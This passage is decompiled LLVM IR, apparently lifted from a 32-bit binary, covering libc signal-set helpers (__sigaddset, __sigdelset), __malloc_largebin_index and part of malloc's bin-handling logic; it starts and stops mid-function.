  %v4_80612c1 = inttoptr i32 %v3_80612c1 to i32*
  %v5_80612c1 = load i32, i32* %v4_80612c1, align 4
  %v7_80612c1 = and i32 %v5_80612c1, %v6_80612c1
  %v8_80612c1 = icmp eq i32 %v7_80612c1, 0
  %v1_80612c5 = icmp eq i1 %v8_80612c1, false
  %v2_80612c5 = zext i1 %v1_80612c5 to i32
  ret i32 %v2_80612c5

; uselistorder directives
  uselistorder i32 %v1_80612b9, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__sigaddset(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_80612cc = load i32, i32* @ebx, align 4
  store i32 %v0_80612cc, i32* %stack_var_-4, align 4
  %v1_80612da = add i32 %arg2, -1
  %v1_80612dd = urem i32 %v1_80612da, 32
  %v2_80612dd = icmp eq i32 %v1_80612dd, 0
  br i1 %v2_80612dd, label %bb6, label %bb

bb:                                               ; preds = %entry
  %v5_80612e0 = shl i32 1, %v1_80612dd
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  %v6_80612e5 = phi i32 [ 1, %entry ], [ %v5_80612e0, %bb ]
  %v2_80612e2 = udiv i32 %v1_80612da, 32
  %v2_80612e5 = mul nuw nsw i32 %v2_80612e2, 4
  %v3_80612e5 = add i32 %v2_80612e5, %arg1
  %v4_80612e5 = inttoptr i32 %v3_80612e5 to i32*
  %v5_80612e5 = load i32, i32* %v4_80612e5, align 4
  %v7_80612e5 = or i32 %v5_80612e5, %v6_80612e5
  store i32 %v7_80612e5, i32* %v4_80612e5, align 4
  %v2_80612ea = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80612ea, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_80612dd, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_80612fa = add i32 %arg2, -1
  %v1_80612fd = urem i32 %v1_80612fa, 32
  %v2_80612fd = icmp eq i32 %v1_80612fd, 0
  br i1 %v2_80612fd, label %bb6, label %bb

bb:                                               ; preds = %entry
  %v4_8061300 = shl i32 -2, %v1_80612fd
  %v5_8061300 = sub nsw i32 32, %v1_80612fd
  %v6_8061300 = lshr i32 -2, %v5_8061300
  %v7_8061300 = or i32 %v6_8061300, %v4_8061300
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  %v6_8061305 = phi i32 [ -2, %entry ], [ %v7_8061300, %bb ]
  %v2_8061302 = udiv i32 %v1_80612fa, 32
  %v2_8061305 = mul nuw nsw i32 %v2_8061302, 4
  %v3_8061305 = add i32 %v2_8061305, %arg1
  %v4_8061305 = inttoptr i32 %v3_8061305 to i32*
  %v5_8061305 = load i32, i32* %v4_8061305, align 4
  %v7_8061305 = and i32 %v5_8061305, %v6_8061305
  store i32 %v7_8061305, i32* %v4_8061305, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_80612fd, { 1, 2, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__malloc_largebin_index() local_unnamed_addr {
entry:
  %v0_806130c = load i32, i32* @eax, align 4
  %v6_806131f = icmp ugt i32 %v0_806130c, 16777215
  br i1 %v6_806131f, label %dec_label_pc_8061330, label %dec_label_pc_8061321

dec_label_pc_8061321:                             ; preds = %entry
  %tmp = icmp ult i32 %v0_806130c, 256
  %v2_806130e = udiv i32 %v0_806130c, 256
  %v2_8061321 = call i32 @llvm.ctlz.i32(i32 %v2_806130e, i1 true)
  %v3_8061321 = xor i32 %v2_8061321, 31
  %v5_8061321 = select i1 %tmp, i32 95, i32 %v3_8061321
  %v1_8061324 = add nuw nsw i32 %v5_8061321, 6
  store i32 %v1_8061324, i32* @ecx, align 4
  %v2_8061327 = urem i32 %v1_8061324, 32
  %v4_8061327 = icmp eq i32 %v2_8061327, 0
  br i1 %v4_8061327, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_8061321
  %v5_8061327 = lshr i32 %v0_806130c, %v2_8061327
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_8061321, %bb
  %v0_8061329 = phi i32 [ %v0_806130c, %dec_label_pc_8061321 ], [ %v5_8061327, %bb ]
  %v1_8061329 = urem i32 %v0_8061329, 4
  %v2_806132c = mul nuw nsw i32 %v5_8061321, 4
  %v3_806132c = or i32 %v1_8061329, 32
  %v4_806132c = add nuw nsw i32 %v3_806132c, %v2_806132c
  br label %dec_label_pc_8061330

dec_label_pc_8061330:                             ; preds = %entry, %bb4
  %v0_8061331 = phi i32 [ 95, %entry ], [ %v4_806132c, %bb4 ]
  ret i32 %v0_8061331

; uselistorder directives
  uselistorder i32 %v2_8061327, { 1, 0 }
  uselistorder i32 %v0_806130c, { 2, 3, 1, 0, 4 }
  uselistorder label %dec_label_pc_8061330, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8061332 = load i32, i32* @ebp, align 4
  %v0_8061333 = load i32, i32* @edi, align 4
  %v0_8061334 = load i32, i32* @esi, align 4
  %v0_8061335 = load i32, i32* @ebx, align 4
  store i32 %v0_8061335, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_8061347 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8061347, i32* %eax.global-to-local, align 4
  %v4_806134c = call i32 @_pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134623208, i32 ptrtoint (i32* @global_var_80719f8.1606 to i32))
  store i32 %v4_806134c, i32* %eax.global-to-local, align 4
  %v1_8061358 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80719f8.1606 to i32))
  store i32 %v1_8061358, i32* %eax.global-to-local, align 4
  %v0_8061360 = load i32, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v0_8061360, -32
  br i1 %tmp, label %dec_label_pc_8061378, label %dec_label_pc_8061365

dec_label_pc_8061365:                             ; preds = %entry
  store i32 -8, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 12, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_8061adf

dec_label_pc_8061378:                             ; preds = %entry
  %v1_8061378 = add i32 %v0_8061360, 11
  store i32 %v1_8061378, i32* %eax.global-to-local, align 4
  %v0_806137b = load i8, i8* @global_var_80788d0.1607, align 1
  %v1_806137b = sext i8 %v0_806137b to i32
  store i32 %v1_806137b, i32* @ebx, align 4
  %v1_8061383 = and i32 %v1_8061378, -8
  %tmp84 = icmp ult i32 %v1_8061378, 16
  %v8_8061391 = select i1 %tmp84, i32 16, i32 %v1_8061383
  store i32 %v8_8061391, i32* %edx.global-to-local, align 4
  %v3_8061396 = urem i8 %v0_806137b, 2
  %v4_8061396 = icmp eq i8 %v3_8061396, 0
  %v1_806139d = icmp eq i1 %v4_8061396, false
  br i1 %v1_806139d, label %dec_label_pc_80613bc, label %dec_label_pc_806139f

dec_label_pc_806139f:                             ; preds = %dec_label_pc_8061378
  %v2_806139f = icmp eq i8 %v0_806137b, 0
  %v1_80613a1 = icmp eq i1 %v2_806139f, false
  br i1 %v1_80613a1, label %dec_label_pc_80616f5, label %dec_label_pc_80613a7

dec_label_pc_80613a7:                             ; preds = %dec_label_pc_806139f
  %v2_80613af = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_80788d0.1607 to i32*))
  store i32 %v2_80613af, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80616f5

dec_label_pc_80613bc:                             ; preds = %dec_label_pc_8061378
  %v11_80613bc = trunc i32 %v8_8061391 to i8
  %v8_80613c0 = icmp ugt i8 %v11_80613bc, %v0_806137b
  br i1 %v8_80613c0, label %dec_label_pc_80613e0, label %dec_label_pc_80613c2

dec_label_pc_80613c2:                             ; preds = %dec_label_pc_80613bc
  %v2_80613c6 = udiv i32 %v8_8061391, 8
  store i32 %v2_80613c6, i32* @ecx, align 4
  %v1_80613c9 = mul nuw i32 %v2_80613c6, 4
  %v2_80613c9 = add i32 %v1_80613c9, ptrtoint (i32* @global_var_80788cc.1608 to i32)
  %v3_80613c9 = inttoptr i32 %v2_80613c9 to i32*
  %v4_80613c9 = load i32, i32* %v3_80613c9, align 4
  store i32 %v4_80613c9, i32* %edx.global-to-local, align 4
  %v1_80613d0 = icmp eq i32 %v4_80613c9, 0
  br i1 %v1_80613d0, label %dec_label_pc_80613e0, label %dec_label_pc_80613d4

dec_label_pc_80613d4:                             ; preds = %dec_label_pc_80613c2
  %v1_80613d4 = add i32 %v4_80613c9, 8
  %v2_80613d4 = inttoptr i32 %v1_80613d4 to i32*
  %v3_80613d4 = load i32, i32* %v2_80613d4, align 4
  store i32 %v3_80613d4, i32* %eax.global-to-local, align 4
  store i32 %v3_80613d4, i32* %v3_80613c9, align 4
  br label %dec_label_pc_8061419

dec_label_pc_80613e0:                             ; preds = %dec_label_pc_80613c2, %dec_label_pc_80613bc
  %v8_80613e0 = icmp ult i32 %v8_8061391, 255
  %v6_80613e8 = icmp ugt i32 %v8_8061391, 255
  store i32 %v8_8061391, i32* @eax, align 4
  br i1 %v6_80613e8, label %dec_label_pc_8061421, label %dec_label_pc_80613ea

dec_label_pc_80613ea:                             ; preds = %dec_label_pc_80613e0
  %v2_80613ee = udiv i32 %v8_8061391, 8
  store i32 %v2_80613ee, i32* %eax.global-to-local, align 4
  %v1_80613f1 = mul nuw i32 %v2_80613ee, 8
  %v2_80613f1 = add i32 %v1_80613f1, ptrtoint (i32* @global_var_80788fc.1609 to i32)
  store i32 %v2_80613f1, i32* @ecx, align 4
  %v1_80613f8 = add i32 %v1_80613f1, add (i32 ptrtoint (i32* @global_var_80788fc.1609 to i32), i32 12)
  %v2_80613f8 = inttoptr i32 %v1_80613f8 to i32*
  %v3_80613f8 = load i32, i32* %v2_80613f8, align 4
  store i32 %v3_80613f8, i32* %edx.global-to-local, align 4
  %v12_80613ff = icmp eq i32 %v3_80613f8, %v2_80613f1
  br i1 %v12_80613ff, label %dec_label_pc_8061560, label %dec_label_pc_8061407

dec_label_pc_8061407:                             ; preds = %dec_label_pc_80613ea
  store i32 %v8_8061391, i32* %ebx.global-to-local, align 4
  %v1_806140b = add i32 %v3_80613f8, 12
  %v2_806140b = inttoptr i32 %v1_806140b to i32*
  %v3_806140b = load i32, i32* %v2_806140b, align 4
  store i32 %v3_806140b, i32* %eax.global-to-local, align 4
  %v2_806140e = or i32 %v8_8061391, 4
  %v3_806140e = add i32 %v3_80613f8, %v2_806140e
  %v4_806140e = inttoptr i32 %v3_806140e to i32*
  %v5_806140e = load i32, i32* %v4_806140e, align 4
  %v6_806140e = or i32 %v5_806140e, 1
  store i32 %v6_806140e, i32* %v4_806140e, align 4
  %v0_8061413 = load i32, i32* %eax.global-to-local, align 4
  %v1_8061413 = load i32, i32* @ecx, align 4
  %v2_8061413 = add i32 %v1_8061413, 12
  %v3_8061413 = inttoptr i32 %v2_8061413 to i32*
  store i32 %v0_8061413, i32* %v3_8061413, align 4
  %v0_8061416 = load i32, i32* @ecx, align 4
  %v1_8061416 = load i32, i32* %eax.global-to-local, align 4
  %v2_8061416 = add i32 %v1_8061416, 8
  %v3_8061416 = inttoptr i32 %v2_8061416 to i32*
  store i32 %v0_8061416, i32* %v3_8061416, align 4
  br label %dec_label_pc_8061419

dec_label_pc_8061419:                             ; preds = %dec_label_pc_80613d4, %dec_label_pc_8061407
  %v0_8061419 = load i32, i32* %edx.global-to-local, align 4
  %v1_8061419 = add i32 %v0_8061419, 8
  store i32 %v1_8061419, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8061ace

dec_label_pc_8061421:                             ; preds = %dec_label_pc_80613e0
  %v0_8061425 = call i32 @__malloc_largebin_index()
  store i32 %v0_8061425, i32* %eax.global-to-local, align 4
  %v3_806142a = and i8 %v0_806137b, 2
  %v4_806142a = icmp eq i8 %v3_806142a, 0
  br i1 %v4_806142a, label %dec_label_pc_8061560, label %dec_label_pc_8061437

dec_label_pc_8061437:                             ; preds = %dec_label_pc_8061421
  %v2_806143f = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_80788d0.1607 to i32*))
  store i32 %v2_806143f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8061560

dec_label_pc_806144c:                             ; preds = %dec_label_pc_8061560, %bb85
  %v0_806156b120 = phi i32 [ %v0_806156b, %bb85 ], [ %v0_806156b112, %dec_label_pc_8061560 ]
  %v1_806144c = add i32 %v0_806156b120, 4
  %v2_806144c = inttoptr i32 %v1_806144c to i32*
  %v3_806144c = load i32, i32* %v2_806144c, align 4
  store i32 %v3_806144c, i32* %esi.global-to-local, align 4
  %v1_806144f = add i32 %v0_806156b120, 12
  %v2_806144f = inttoptr i32 %v1_806144f to i32*
  %v3_806144f = load i32, i32* %v2_806144f, align 4
  store i32 %v3_806144f, i32* %edx.global-to-local, align 4
  %v1_8061452 = and i32 %v3_806144c, -4
  store i32 %v1_8061452, i32* %esi.global-to-local, align 4
  br i1 %v6_80613e8, label %dec_label_pc_80614b6, label %dec_label_pc_806145f

dec_label_pc_806145f:                             ; preds = %dec_label_pc_806144c
  %v9_806145f = icmp eq i32 %v3_806144f, 134711556
  %v1_8061465 = icmp eq i1 %v9_806145f, false
  br i1 %v1_8061465, label %dec_label_pc_80614b6, label %dec_label_pc_8061467

dec_label_pc_8061467:                             ; preds = %dec_label_pc_806145f
  %v1_8061467 = load i32, i32* @global_var_8078900.1610, align 256
  %v12_8061467 = icmp eq i32 %v0_806156b120, %v1_8061467
  %v1_806146d = icmp eq i1 %v12_8061467, false
  br i1 %v1_806146d, label %dec_label_pc_80614b6, label %dec_label_pc_806146f

dec_label_pc_806146f:                             ; preds = %dec_label_pc_8061467
  %tmp137 = icmp ugt i32 %v1_8061452, %v1_8061564
  br i1 %tmp137, label %dec_label_pc_8061475, label %dec_label_pc_80614b6

dec_label_pc_8061475:                             ; preds = %dec_label_pc_806146f
  %v5_806147b = sub i32 %v1_8061452, %v8_8061391
  store i32 %v5_806147b, i32* %eax.global-to-local, align 4
  %v2_806147f = add i32 %v0_806156b120, %v8_8061391
  store i32 %v2_806147f, i32* %edx.global-to-local, align 4
  %v1_8061483 = or i32 %v8_8061391, 1
  store i32 %v1_8061483, i32* %v2_806144c, align 4
  %v0_8061489 = load i32, i32* %eax.global-to-local, align 4
  %v1_806148b = or i32 %v0_8061489, 1
  store i32 %v1_806148b, i32* @ecx, align 4
  %v0_806148e = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_806148e, i32* @global_var_8078900.1610, align 256
  store i32 %v0_806148e, i32* @global_var_807890c.1611, align 4
  store i32 %v0_806148e, i32* @global_var_8078910.1612, align 16
  %v1_80614a0 = add i32 %v0_806148e, 8
  %v2_80614a0 = inttoptr i32 %v1_80614a0 to i32*
  store i32 ptrtoint (i32* @global_var_8078904.1613 to i32), i32* %v2_80614a0, align 4
  %v0_80614a7 = load i32, i32* %edx.global-to-local, align 4
  %v1_80614a7 = add i32 %v0_80614a7, 12
  %v2_80614a7 = inttoptr i32 %v1_80614a7 to i32*
  store i32 ptrtoint (i32* @global_var_8078904.1613 to i32), i32* %v2_80614a7, align 4
  %v0_80614ae = load i32, i32* @ecx, align 4
  %v1_80614ae = load i32, i32* %edx.global-to-local, align 4
  %v2_80614ae = add i32 %v1_80614ae, 4
  %v3_80614ae = inttoptr i32 %v2_80614ae to i32*
  store i32 %v0_80614ae, i32* %v3_80614ae, align 4
  %v0_80614b1 = load i32, i32* %eax.global-to-local, align 4
  %v1_80614b1 = load i32, i32* %edx.global-to-local, align 4
  %v3_80614b1 = add i32 %v1_80614b1, %v0_80614b1
  %v4_80614b1 = inttoptr i32 %v3_80614b1 to i32*
  store i32 %v0_80614b1, i32* %v4_80614b1, align 4
  br label %dec_label_pc_80614d0

dec_label_pc_80614b6:                             ; preds = %dec_label_pc_806146f, %dec_label_pc_8061467, %dec_label_pc_806145f, %dec_label_pc_806144c
  %v15_80614b6 = icmp eq i32 %v1_8061452, %v8_8061391
  store i32 ptrtoint (i32* @global_var_8078904.1613 to i32), i32* %eax.global-to-local, align 4
  store i32 %v3_806144f, i32* @global_var_8078910.1612, align 4
  %v2_80614c2 = add i32 %v3_806144f, 8
  %v3_80614c2 = inttoptr i32 %v2_80614c2 to i32*
  store i32 ptrtoint (i32* @global_var_8078904.1613 to i32), i32* %v3_80614c2, align 4
  %v1_80614c5 = icmp eq i1 %v15_80614b6, false
  br i1 %v1_80614c5, label %dec_label_pc_80614d8, label %dec_label_pc_80614c7

dec_label_pc_80614c7:                             ; preds = %dec_label_pc_80614b6
  store i32 %v8_8061391, i32* %ebx.global-to-local, align 4
  %v0_80614cb = load i32, i32* @ebp, align 4
  %v2_80614cb = or i32 %v8_8061391, 4
  %v3_80614cb = add i32 %v0_80614cb, %v2_80614cb
  %v4_80614cb = inttoptr i32 %v3_80614cb to i32*
  %v5_80614cb = load i32, i32* %v4_80614cb, align 4
  %v6_80614cb = or i32 %v5_80614cb, 1
  store i32 %v6_80614cb, i32* %v4_80614cb, align 4
  br label %dec_label_pc_80614d0

dec_label_pc_80614d0:                             ; preds = %dec_label_pc_8061475, %dec_label_pc_80614c7
  %v0_80614d0 = load i32, i32* @ebp, align 4
  %v1_80614d0 = add i32 %v0_80614d0, 8
  store i32 %v1_80614d0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8061ace

dec_label_pc_80614d8:                             ; preds = %dec_label_pc_80614b6
  %v0_80614d8 = load i32, i32* %esi.global-to-local, align 4
  %v6_80614de = icmp ugt i32 %v0_80614d8, 255
  br i1 %v6_80614de, label %dec_label_pc_80614f5, label %dec_label_pc_80614e0

dec_label_pc_80614e0:                             ; preds = %dec_label_pc_80614d8
  %v2_80614e2 = udiv i32 %v0_80614d8, 8
  %v1_80614e5 = mul nuw i32 %v2_80614e2, 8
  %v2_80614e5 = add i32 %v1_80614e5, 134711548
  store i32 %v2_80614e5, i32* %eax.global-to-local, align 4
  %v1_80614ec = add i32 %v1_80614e5, 134711556
  %v2_80614ec = inttoptr i32 %v1_80614ec to i32*
  %v3_80614ec = load i32, i32* %v2_80614ec, align 4
  store i32 %v3_80614ec, i32* @ebx, align 4
  br label %dec_label_pc_8061536

dec_label_pc_80614f5:                             ; preds = %dec_label_pc_80614d8
  store i32 %v0_80614d8, i32* @eax, align 4
  %v0_80614f7 = call i32 @__malloc_largebin_index()
  store i32 %v0_80614f7, i32* %eax.global-to-local, align 4
  %v1_80614fc = mul i32 %v0_80614f7, 8
  %v2_80614fc = add i32 %v1_80614fc, ptrtoint (i32* @global_var_80788fc.1609 to i32)
  store i32 %v2_80614fc, i32* %edx.global-to-local, align 4
  %v1_8061505 = add i32 %v1_80614fc, add (i32 ptrtoint (i32* @global_var_80788fc.1609 to i32), i32 8)
  %v2_8061505 = inttoptr i32 %v1_8061505 to i32*
  %v3_8061505 = load i32, i32* %v2_8061505, align 4
  store i32 %v3_8061505, i32* @ebx, align 4
  %v12_806150c = icmp eq i32 %v3_8061505, %v2_80614fc
  br i1 %v12_806150c, label %dec_label_pc_8061536, label %dec_label_pc_8061510

dec_label_pc_8061510:                             ; preds = %dec_label_pc_80614f5
  %v1_8061510 = add i32 %v1_80614fc, add (i32 ptrtoint (i32* @global_var_80788fc.1609 to i32), i32 12)
  %v2_8061510 = inttoptr i32 %v1_8061510 to i32*
  %v3_8061510 = load i32, i32* %v2_8061510, align 4
  store i32 %v3_8061510, i32* %eax.global-to-local, align 4
  %v0_8061513 = load i32, i32* %esi.global-to-local, align 4
  %v2_8061513 = add i32 %v3_8061510, 4
  %v3_8061513 = inttoptr i32 %v2_8061513 to i32*
  %v4_8061513 = load i32, i32* %v3_8061513, align 4
  %v10_8061513 = icmp ult i32 %v0_8061513, %v4_8061513
  %v1_8061516 = icmp eq i1 %v10_8061513, false
  br i1 %v1_8061516, label %dec_label_pc_8061520, label %dec_label_pc_8061518

dec_label_pc_8061518:                             ; preds = %dec_label_pc_8061510
  store i32 %v2_80614fc, i32* @ebx, align 4
  br label %dec_label_pc_8061536

dec_label_pc_8061520:                             ; preds = %dec_label_pc_8061510
  %v1_8061522 = or i32 %v0_8061513, 1
  store i32 %v1_8061522, i32* %eax.global-to-local, align 4
  %v2_806152a104 = add i32 %v3_8061505, 4
  %v3_806152a105 = inttoptr i32 %v2_806152a104 to i32*
  %v4_806152a106 = load i32, i32* %v3_806152a105, align 4
  %v10_806152a108 = icmp ult i32 %v1_8061522, %v4_806152a106
  br i1 %v10_806152a108, label %dec_label_pc_8061527, label %dec_label_pc_806152f

dec_label_pc_8061527:                             ; preds = %dec_label_pc_8061520, %dec_label_pc_8061527
  %v1_806152a109 = phi i32 [ %v3_8061527, %dec_label_pc_8061527 ], [ %v3_8061505, %dec_label_pc_8061520 ]
  %v1_8061527 = add i32 %v1_806152a109, 8
  %v2_8061527 = inttoptr i32 %v1_8061527 to i32*
  %v3_8061527 = load i32, i32* %v2_8061527, align 4
  store i32 %v3_8061527, i32* @ebx, align 4
  %v2_806152a = add i32 %v3_8061527, 4
  %v3_806152a = inttoptr i32 %v2_806152a to i32*
  %v4_806152a = load i32, i32* %v3_806152a, align 4
  %v10_806152a = icmp ult i32 %v1_8061522, %v4_806152a
  br i1 %v10_806152a, label %dec_label_pc_8061527, label %dec_label_pc_806152f

dec_label_pc_806152f:                             ; preds = %dec_label_pc_8061527, %dec_label_pc_8061520
  %v1_806152a.lcssa = phi i32 [ %v3_8061505, %dec_label_pc_8061520 ], [ %v3_8061527, %dec_label_pc_8061527 ]
  %v1_806152f = add i32 %v1_806152a.lcssa, 12
  %v2_806152f = inttoptr i32 %v1_806152f to i32*
  %v3_806152f = load i32, i32* %v2_806152f, align 4
  store i32 %v3_806152f, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8061536

dec_label_pc_8061536:                             ; preds = %dec_label_pc_80614f5, %dec_label_pc_8061518, %dec_label_pc_80614e0, %dec_label_pc_806152f
  %v0_8061544 = phi i32 [ %v0_80614f7, %dec_label_pc_80614f5 ], [ %v0_80614f7, %dec_label_pc_806152f ], [ %v0_80614f7, %dec_label_pc_8061518 ], [ %v2_80614e2, %dec_label_pc_80614e0 ]
  %stack_var_-68.0 = phi i32 [ %v2_80614fc, %dec_label_pc_80614f5 ], [ %v3_806152f, %dec_label_pc_806152f ], [ %v3_8061510, %dec_label_pc_8061518 ], [ %v2_80614e5, %dec_label_pc_80614e0 ]
  store i32 %v0_8061544, i32* %edx.global-to-local, align 4
  %v1_8061538 = urem i32 %v0_8061544, 32
  %v2_8061538 = icmp eq i32 %v1_8061538, 0
  store i32 1, i32* %eax.global-to-local, align 4
  store i32 %v1_8061538, i32* @ecx, align 4
  br i1 %v2_8061538, label %bb85, label %bb

bb:                                               ; preds = %dec_label_pc_8061536
  %v5_8061542 = shl i32 1, %v1_8061538
  store i32 %v5_8061542, i32* %eax.global-to-local, align 4
  br label %bb85

bb85:                                             ; preds = %dec_label_pc_8061536, %bb
  %v5_8061547 = phi i32 [ 1, %dec_label_pc_8061536 ], [ %v5_8061542, %bb ]
  %v2_8061544 = sdiv i32 %v0_8061544, 32
  store i32 %v2_8061544, i32* %edx.global-to-local, align 4
  %v1_8061547 = mul nsw i32 %v2_8061544, 4
  %v2_8061547 = add i32 %v1_8061547, ptrtoint (i32* @global_var_8078c04.1614 to i32)
  %v3_8061547 = inttoptr i32 %v2_8061547 to i32*
  %v4_8061547 = load i32, i32* %v3_8061547, align 4
  %v6_8061547 = or i32 %v4_8061547, %v5_8061547
  store i32 %v6_8061547, i32* %v3_8061547, align 4
  store i32 %stack_var_-68.0, i32* %eax.global-to-local, align 4
  %v0_8061552 = load i32, i32* @ebx, align 4
  %v1_8061552 = load i32, i32* @ebp, align 4
  %v2_8061552 = add i32 %v1_8061552, 8
  %v3_8061552 = inttoptr i32 %v2_8061552 to i32*
  store i32 %v0_8061552, i32* %v3_8061552, align 4
  %v0_8061555 = load i32, i32* %eax.global-to-local, align 4
  %v1_8061555 = load i32, i32* @ebp, align 4
  %v2_8061555 = add i32 %v1_8061555, 12
  %v3_8061555 = inttoptr i32 %v2_8061555 to i32*
  store i32 %v0_8061555, i32* %v3_8061555, align 4
  %v0_8061558 = load i32, i32* @ebp, align 4
  %v1_8061558 = load i32, i32* %eax.global-to-local, align 4
  %v2_8061558 = add i32 %v1_8061558, 8
  %v3_8061558 = inttoptr i32 %v2_8061558 to i32*
  store i32 %v0_8061558, i32* %v3_8061558, align 4
  %v0_806155b = load i32, i32* @ebp, align 4
  %v1_806155b = load i32, i32* @ebx, align 4
  %v2_806155b = add i32 %v1_806155b, 12
  %v3_806155b = inttoptr i32 %v2_806155b to i32*
  store i32 %v0_806155b, i32* %v3_806155b, align 4
  %v0_806156b = load i32, i32* @global_var_8078910.1612, align 16
  store i32 %v0_806156b, i32* @ebp, align 4
  %v9_8061571 = icmp eq i32 %v0_806156b, 134711556
  %v1_8061577 = icmp eq i1 %v9_8061571, false
  br i1 %v1_8061577, label %dec_label_pc_806144c, label %dec_label_pc_806157d

dec_label_pc_8061560:                             ; preds = %dec_label_pc_8061421, %dec_label_pc_80613ea, %dec_label_pc_8061437
  %stack_var_-56.0 = phi i32 [ %v0_8061425, %dec_label_pc_8061421 ], [ %v0_8061425, %dec_label_pc_8061437 ], [ %v2_80613ee, %dec_label_pc_80613ea ]
  %v1_8061564 = add i32 %v8_8061391, 16
  store i32 %v1_8061564, i32* %edx.global-to-local, align 4
  %v0_806156b112 = load i32, i32* @global_var_8078910.1612, align 16
  store i32 %v0_806156b112, i32* @ebp, align 4
  %v9_8061571117 = icmp eq i32 %v0_806156b112, 134711556
  %v1_8061577119 = icmp eq i1 %v9_8061571117, false
  br i1 %v1_8061577119, label %dec_label_pc_806144c, label %dec_label_pc_806157d

dec_label_pc_806157d:                             ; preds = %bb85, %dec_label_pc_8061560
  br i1 %v8_80613e0, label %dec_label_pc_8061610, label %dec_label_pc_806158b

dec_label_pc_806158b:                             ; preds = %dec_label_pc_806157d
  store i32 %stack_var_-56.0, i32* %ecx.global-to-local, align 4
  %v1_806158f = mul i32 %stack_var_-56.0, 8
  %v2_806158f = add i32 %v1_806158f, ptrtoint (i32* @global_var_80788fc.1609 to i32)
  store i32 %v2_806158f, i32* %edx.global-to-local, align 4
  %v1_8061596 = add i32 %v1_806158f, add (i32 ptrtoint (i32* @global_var_80788fc.1609 to i32), i32 12)
  %v2_8061596 = inttoptr i32 %v1_8061596 to i32*
  %storemerge2.pre = load i32, i32* %v2_8061596, align 4
  br label %dec_label_pc_806160c

dec_label_pc_806159b:                             ; preds = %dec_label_pc_806160c
  %v1_806159b = add i32 %v4_80615b2, 4
  %v2_806159b = inttoptr i32 %v1_806159b to i32*
  %v3_806159b = load i32, i32* %v2_806159b, align 4
  store i32 %v3_806159b, i32* %ebx.global-to-local, align 4
  %v1_806159e = add i32 %v4_80615b2, 12
  %v2_806159e = inttoptr i32 %v1_806159e to i32*
  %v3_806159e = load i32, i32* %v2_806159e, align 4
  store i32 %v3_806159e, i32* %ecx.global-to-local, align 4
  %v1_80615a1 = and i32 %v3_806159b, -4
  store i32 %v1_80615a1, i32* %ebx.global-to-local, align 4
  %v10_80615a4 = icmp ult i32 %v1_80615a1, %v8_8061391
  br i1 %v10_80615a4, label %dec_label_pc_806160c, label %dec_label_pc_80615aa

dec_label_pc_80615aa:                             ; preds = %dec_label_pc_806159b
  %v1_80615aa = add i32 %v4_80615b2, 8
  %v2_80615aa = inttoptr i32 %v1_80615aa to i32*
  %v3_80615aa = load i32, i32* %v2_80615aa, align 4
  store i32 %v3_80615aa, i32* %edx.global-to-local, align 4
  %v1_80615ad = add i32 %v3_80615aa, 12
  %v2_80615ad = inttoptr i32 %v1_80615ad to i32*
  %v3_80615ad = load i32, i32* %v2_80615ad, align 4
  %v15_80615ad = icmp eq i32 %v3_80615ad, %v4_80615b2
  %v1_80615b0 = icmp eq i1 %v15_80615ad, false
  br i1 %v1_80615b0, label %dec_label_pc_80615b7, label %dec_label_pc_80615b2

dec_label_pc_80615b2:                             ; preds = %dec_label_pc_80615aa
  %v1_80615b2 = add i32 %v3_806159e, 8
  %v2_80615b2 = inttoptr i32 %v1_80615b2 to i32*
  %v3_80615b2 = load i32, i32* %v2_80615b2, align 4
  %v15_80615b2 = icmp eq i32 %v3_80615b2, %v4_80615b2
  br i1 %v15_80615b2, label %dec_label_pc_80615bc, label %dec_label_pc_80615b7

dec_label_pc_80615b7:                             ; preds = %dec_label_pc_80615b2, %dec_label_pc_80615aa
  %v0_80615b7 = call i32 @abort()
  store i32 %v0_80615b7, i32* %eax.global-to-local, align 4
  %v0_80615bc.pre = load i32, i32* @ebx, align 4
  %v0_80615c2.pre = load i32, i32* @ecx, align 4
  %v1_80615c2.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80615bc

dec_label_pc_80615bc:                             ; preds = %dec_label_pc_80615b2, %dec_label_pc_80615b7
  %v1_80615c2 = phi i32 [ %v3_80615aa, %dec_label_pc_80615b2 ], [ %v1_80615c2.pre, %dec_label_pc_80615b7 ]
  %v0_80615c2 = phi i32 [ %v3_806159e, %dec_label_pc_80615b2 ], [ %v0_80615c2.pre, %dec_label_pc_80615b7 ]
